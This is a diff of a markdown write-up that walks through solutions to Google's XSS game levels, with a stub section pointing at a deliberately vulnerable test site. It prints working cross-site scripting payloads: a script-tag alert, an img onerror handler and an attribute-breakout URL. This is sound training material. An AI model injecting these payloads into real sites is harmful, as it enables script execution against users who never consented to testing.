@@ -17,18 +17,21 @@
 https://xss-game.appspot.com/level1
 ```
 - - Level 1
+
 This is the most obvious and easiest one. Just insert following code and you're done:
 ```js
 <script>alert(1)</script>
 ```
 -------------------------------------------------------------------
 - - Level 2
+
 Since the `script` won't work you'll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use `img` tags along with the `onerror` attributes. Here you go:
 ```js
 <img src="http://inexist.ent" onerror="javascript:alert(1)"/>
 ```
 --------------------------------------------------------------------
 - - Level 3
+
 Well this time I had to read some code in order to understand the applications logic. If you toggle the code you'll see `index.html:`
 ```html
 [...]
@@ -47,6 +50,7 @@ https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)';
 ```
 ---------------------------------------------------------------
 - - Level 4
+
 This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting `https://xss-game.appspot.com/level4/frame?timer='` showed me following output:
 
 ```js
@@ -159,9 +163,8 @@ Have you noticed something about the regexp? No?! Seriously not? Ok. It's not ca
 # Conclusion
 This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)
 
+#####################################################################################
 
-
-----------------------------------------------------------------
 # test 2
 ```
 http://testphp.vulnweb.com/
